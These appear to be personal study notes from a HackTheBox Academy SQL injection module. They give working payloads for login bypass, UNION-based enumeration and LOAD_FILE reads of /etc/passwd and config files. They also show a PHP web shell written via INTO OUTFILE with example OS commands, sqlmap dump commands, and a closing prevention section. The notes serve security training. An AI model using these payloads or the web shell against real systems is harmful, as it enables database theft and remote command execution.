# SQL Injection — Complete Study Notes

> Personal study notes covering SQL Injection from fundamentals to exploitation.  
> Based on HackTheBox Academy — SQL Injection module.

---


## 1. What is SQL Injection?

SQL Injection (SQLi) is an attack against **relational databases** like MySQL. A malicious user manipulates input to **change the SQL query** the web application sends to the database.

```
Normal flow:   User Input  →  Web App  →  SQL Query  →  Database
Attacked flow: Malicious Input  →  Web App  →  MODIFIED SQL Query  →  Database leaks data
```

**Why it works:** The web application takes user input and puts it directly into a SQL query without sanitizing it:

```php
// Vulnerable PHP code
$query = "SELECT * FROM logins WHERE username = '" . $_POST['username'] . "'";
//                                                   ↑
//                                    User input goes here RAW — no protection
```

When the attacker sends `' OR '1'='1`, the query becomes:
```sql
SELECT * FROM logins WHERE username = '' OR '1'='1'
-- Always true → returns ALL rows
```

---

## 2. Database Fundamentals

### DBMS (Database Management System)
Software that hosts and manages databases. Key features:
- **Concurrency** — multiple users at the same time
- **Consistency** — data stays accurate
- **Security** — access control
- **Reliability** — data persistence
- **SQL** — query language

### Types of Databases

| Type | Structure | Examples |
|------|-----------|---------|
| **Relational** | Fixed schema — tables with rows/columns | MySQL, PostgreSQL, MSSQL |
| **Non-Relational** | No fixed structure, flexible storage | MongoDB, Redis, Cassandra |

> SQL Injection targets **relational databases** using the SQL language.

---

## 3. MySQL Basics

### Connecting to MySQL

```bash
mysql -u username -p
mysql -u username -h host -P port -p --skip-ssl
```

### Core SQL Commands

```sql
-- Databases
CREATE DATABASE users;
SHOW DATABASES;
USE users;

-- Tables
CREATE TABLE logins(
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100),
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
SHOW TABLES;
DESCRIBE logins;

-- INSERT
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO logins(username, password) VALUES('user', 'pass');

-- SELECT
SELECT * FROM logins;
SELECT username, password FROM logins;

-- UPDATE
UPDATE logins SET password='newpass' WHERE username='admin';

-- DROP
DROP TABLE logins;

-- ALTER
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO renamedColumn;
ALTER TABLE logins DROP renamedColumn;
```

### Filtering & Sorting

```sql
SELECT * FROM logins ORDER BY password DESC, id ASC;
SELECT * FROM logins LIMIT 3;
SELECT * FROM logins WHERE username LIKE 'adm%';
```

### Operators

| Operator | Symbol |
|----------|--------|
| Comparison | `=`, `>`, `<`, `>=`, `<=`, `!=`, `LIKE` |
| Logical | `AND (&&)`, `OR (\|\|)`, `NOT (!)` |
| Arithmetic | `+`, `-`, `*`, `/`, `%` |

---

## 4. Types of SQL Injection

### Injection Location Types
- **In-band** — result visible directly in the page (UNION, Error-based)
- **Blind** — no direct output, inferred from behavior (Boolean, Time-based)
- **Out-of-band** — data sent to external server

### SQLMap Injection Techniques (What Happens Automatically)

#### 🔵 Boolean-Based Blind
```sql
id=1 AND 1=1   → page loads normally   (TRUE)
id=1 AND 1=2   → page changes/breaks   (FALSE)
```
SQLMap asks yes/no questions to extract data bit by bit.
> Think of it as: *"Is the first letter of the password > M? Yes/No?"*

#### 🔴 Error-Based
```sql
id=1 AND (SELECT COUNT(*), CONCAT((SELECT password FROM users), FLOOR(RAND()*2)) FROM ...)
```
Forces the DB to throw an error that **contains the data** inside the error message itself.
> Think of it as: *Making the database accidentally reveal info in its own crash report.*

#### 🟡 Stacked Queries
```sql
id=1; SELECT SLEEP(5)#
```
Uses `;` to **run a second SQL query** after the first. Very powerful — can write files, create users.
> Think of it as: *Ending one sentence and starting a completely new one.*

#### ⏱️ Time-Based Blind
```sql
id=1 AND SLEEP(5)
```
If the page **delays 5 seconds** → condition is TRUE. If instant → FALSE. Extracts data via timing.
> Think of it as: *"If the password starts with A, wait 5 seconds. Otherwise respond immediately."*

#### 🟢 UNION Query
```sql
id=1 UNION ALL SELECT NULL, NULL, username, password FROM users--
```
Appends a **completely new SELECT** to the original query and returns data directly in the page output. Fastest and most direct method.
> Think of it as: *Hijacking the DB query and injecting your own result set into it.*

---

## 5. Authentication Bypass

### OR Operator Bypass
```
Username: admin' OR '1'='1
Password: anything
```
Resulting query:
```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='anything'
-- '1'='1' is always true → login granted
```

### Comment-Based Bypass
```
Username: admin'-- -
Password: (ignored)
```
Resulting query:
```sql
SELECT * FROM logins WHERE username='admin'-- -' AND password='...'
--                                          ↑ everything after here is commented out
```

### ID-Based Bypass
```
Username: ' OR id=5)-- -
```

---

## 6. UNION-Based Injection

UNION combines results of two SELECT statements. Rules:
- Both SELECTs must have the **same number of columns**
- Data types must be compatible

### Step 1 — Find Number of Columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   ← error here means 2 columns exist
```

Or using UNION NULL method:
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL, NULL-- -
' UNION SELECT NULL, NULL, NULL-- -   ← no error = 3 columns
```

### Step 2 — Find Printable Column

```sql
' UNION SELECT 1, 2, 3, 4-- -
```
Check which number appears on the page — that column is printable.

### Step 3 — Extract Data

```sql
' UNION SELECT 1, username, password, 4 FROM users-- -
```

---

## 7. Database Enumeration

### Fingerprint the Database

```sql
SELECT @@version       -- MySQL/MSSQL version
SELECT POW(1,1)        -- MySQL specific
SELECT SLEEP(5)        -- MySQL specific
```

### The INFORMATION_SCHEMA Roadmap

`INFORMATION_SCHEMA` is a special DB that contains **metadata** about all other databases — tables, columns, privileges.

```
INFORMATION_SCHEMA
├── SCHEMATA        → lists all databases
├── TABLES          → lists all tables (filtered by table_schema)
├── COLUMNS         → lists all columns (filtered by table_name)
└── USER_PRIVILEGES → lists user privileges
```

### Enumeration Queries

```sql
-- 1. List all databases
cn' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

-- 2. Which DB is the app currently using?
cn' UNION SELECT 1, database(), 3, 4-- -

-- 3. List tables in a specific database
cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES
WHERE table_schema='target_db'-- -

-- 4. List columns in a specific table
cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA
FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'-- -

-- 5. Dump the data
cn' UNION SELECT 1, username, password, 4 FROM target_db.users-- -
```

---

## 8. Reading Files via SQLi

SQL Injection can go beyond data theft — you can **read server files** if the DB user has sufficient privileges.

### Attack Chain

```
Check DB user  →  Check FILE privilege  →  Read files with LOAD_FILE()
```

### Step 1 — Identify Current DB User

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
```

### Step 2 — Check Superuser Status

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
-- Returns 'Y' = YES (superuser)
```

### Step 3 — Check FILE Privilege

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4
FROM information_schema.user_privileges
WHERE grantee="'root'@'localhost'"-- -
-- Look for 'FILE' in the results
```

### Step 4 — Read Files with LOAD_FILE()

```sql
-- Read /etc/passwd
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

-- Read web application source code
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/index.php"), 3, 4-- -
```

> **Tip:** The browser may render PHP as blank HTML. Hit `Ctrl+U` to view raw page source.

### Source Code Disclosure Chaining

Each file you read gives you clues to read the next one:

```
1. Read search.php
        ↓
   Find: include("config.php")
        ↓
2. Read config.php
        ↓
   Find: DB credentials / passwords
```

---

## 9. Writing Files & Web Shells

If the DB user has **FILE + write privileges**, you can write a PHP web shell to the server.

### Check Write Permissions

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv"-- -
-- Empty value = write anywhere allowed
```

### Write a Web Shell

```sql
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" 
INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Using the Web Shell

Once written, browse to it and pass any OS command via `?0=`:

```
http://TARGET/shell.php?0=id
http://TARGET/shell.php?0=whoami
http://TARGET/shell.php?0=cat+/etc/passwd
http://TARGET/shell.php?0=find+/+-name+"flag.txt"+2>/dev/null
http://TARGET/shell.php?0=cat+/var/www/html/config.php
```

> Use `+` instead of spaces in the URL.  
> This gives you a **remote terminal in your browser**.

### How the Shell Works

```php
<?php system($_REQUEST[0]); ?>
//            ↑
//   Takes whatever you pass as ?0=
//   Executes it as an OS command
//   Prints the output to the page
```

---

## 10. Using SQLMap

SQLMap is an automated SQL injection tool that **detects and exploits** SQLi vulnerabilities automatically.

### Basic Usage

```bash
# GET parameter
sqlmap -u 'http://target.com/page.php?id=1'

# POST parameter
sqlmap 'http://target.com/page.php' --data 'id=1'

# Cookie injection
sqlmap 'http://target.com/page.php' --cookie='id=1*'

# JSON body
sqlmap 'http://target.com/page.php' --data '{"id":1}'

# Full HTTP request file (from Burp)
sqlmap -r request.txt
```

### Key Flags

| Flag | Purpose |
|------|---------|
| `--batch` | Auto-answer all prompts (no manual input) |
| `--dbs` | List all databases |
| `--tables` | List tables in a database |
| `-D dbname` | Select a specific database |
| `-T tablename` | Select a specific table |
| `--dump` | Extract/dump table contents |
| `--random-agent` | Randomize User-Agent to bypass WAF |
| `--mobile` | Imitate a smartphone |
| `--method PUT` | Use a custom HTTP method |
| `*` marker | Pin the exact injection point |

### Why `id=1`?

`id=1` is simply a **valid normal value** to give SQLMap a working request as a starting point. SQLMap then **modifies** that value automatically to test for injection:

```
You give:    id=1               (normal — app works fine)
SQLMap tests: id=1 AND 1=1
              id=1 AND 1=2
              id=1 UNION SELECT NULL--
              id=1'
              ... hundreds of payloads automatically
```

---

## 11. SQLMap — HTTP Requests

### Where Can the Injection Be?

The key skill is identifying **where the vulnerable parameter is** in the HTTP request.

```
WHERE is the parameter?
├── In the URL?           → -u 'http://site.com/page.php?id=1'
├── In POST form body?    → --data 'id=1'
├── In a Cookie?          → --cookie='id=1*'
└── In JSON body?         → --data '{"id":1}'
```

**How to find it:** Open browser DevTools (F12) → Network tab → interact with the page → inspect the request.

### Case Examples

#### Case 2 — POST Parameter
```bash
sqlmap 'http://TARGET/case2.php' \
  --data 'id=1' \
  -D testdb -T flag2 --dump --batch
```

#### Case 3 — Cookie Injection
The `*` marker tells SQLMap exactly where to inject inside the cookie:
```bash
sqlmap 'http://TARGET/case3.php' \
  --cookie='id=1*' \
  -D testdb -T flag3 --dump --batch
```

#### Case 4 — JSON Body
SQLMap automatically detects and processes JSON format:
```bash
sqlmap 'http://TARGET/case4.php' \
  --data '{"id":1}' \
  -D testdb -T flag4 --dump --batch
```

#### Using a Burp Request File
Capture the request in Burp → save to `req.txt` → use `-r`:
```bash
sqlmap -r req.txt -D testdb -T flag4 --dump --batch
```

You can pin the injection point inside the file with `*`:
```
GET /page.php?id=1* HTTP/1.1
Host: target.com
```

### Custom Headers

```bash
# Specific cookie
sqlmap ... --cookie='PHPSESSID=abc123'

# Custom header
sqlmap ... -H='X-Custom-Header: value*'

# Bypass WAF with random User-Agent
sqlmap ... --random-agent
```

---

## 12. SQLMap — Flag Hunting Strategy

### Universal Flag Hunting Flow

```
Step 1: Find databases       →   --dbs
Step 2: List tables          →   -D dbname --tables
Step 3: Dump the flag table  →   -D dbname -T flagX --dump
```

### Full Commands

```bash
# Step 1 — Find databases
sqlmap 'http://TARGET/page.php' --data 'id=1' --dbs --batch

# Step 2 — List tables
sqlmap 'http://TARGET/page.php' --data 'id=1' -D testdb --tables --batch

# Step 3 — Dump flag
sqlmap 'http://TARGET/page.php' --data 'id=1' -D testdb -T flag1 --dump --batch
```

### Finding Flags via Web Shell

```bash
# Find ALL flag files on the system
http://TARGET/shell.php?0=find+/+-name+"flag*"+2>/dev/null

# Common locations to check
http://TARGET/shell.php?0=cat+/var/www/html/flag.txt
http://TARGET/shell.php?0=cat+/root/flag.txt
http://TARGET/shell.php?0=ls+/home
```

---

## 13. Prevention

### 1. Parameterized Queries ← Most Effective

```php
// ❌ Vulnerable
$query = "SELECT * FROM users WHERE id = " . $_POST['id'];

// ✅ Safe — input is NEVER interpreted as SQL
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_POST['id']]);
```

### 2. Input Sanitization

Escape special characters before they reach the query:
```php
$id = mysqli_real_escape_string($conn, $_POST['id']);
```

### 3. Input Validation

Reject input that doesn't match expected format:
```php
if (!preg_match('/^[0-9]+$/', $_POST['id'])) {
    die("Invalid input");
}
```

### 4. Least Privilege

Never connect the web app with a root/admin DB user. Create a dedicated user with only the permissions it needs:
```sql
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON mydb.products TO 'webapp'@'localhost';
-- No FILE, no INSERT, no DROP — limits blast radius
```

### 5. Web Application Firewall (WAF)

Sits in front of the app and blocks requests containing known SQLi patterns (`UNION SELECT`, `INFORMATION_SCHEMA`, etc.).
- Free: ModSecurity
- Paid: Cloudflare, AWS WAF

---

## 14. Quick Reference Cheatsheet

### Enumeration Payloads

| Goal | Payload |
|------|---------|
| Current DB user | `UNION SELECT 1, user(), 3, 4-- -` |
| Current database | `UNION SELECT 1, database(), 3, 4-- -` |
| List all databases | `UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -` |
| List tables | `UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='db'-- -` |
| List columns | `UNION SELECT 1, COLUMN_NAME, TABLE_NAME, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='tbl'-- -` |
| Check superuser | `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` |
| Check FILE privilege | `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -` |
| Read a file | `UNION SELECT 1, LOAD_FILE("/path/to/file"), 3, 4-- -` |

### SQLMap Quick Commands

```bash
# GET
sqlmap -u 'http://target.com/?id=1' --dbs --batch

# POST
sqlmap 'http://target.com/' --data 'id=1' -D db -T table --dump --batch

# Cookie
sqlmap 'http://target.com/' --cookie='id=1*' -D db -T table --dump --batch

# JSON
sqlmap 'http://target.com/' --data '{"id":1}' -D db -T table --dump --batch

# From Burp file
sqlmap -r req.txt -D db -T table --dump --batch
```

### Common Default Paths

| Purpose | Path |
|---------|------|
| Apache webroot | `/var/www/html/` |
| Nginx webroot | `/usr/share/nginx/html/` |
| Linux users | `/etc/passwd` |
| PHP config files | `/var/www/html/config.php` |

---

*Notes based on HackTheBox Academy — SQL Injection Module*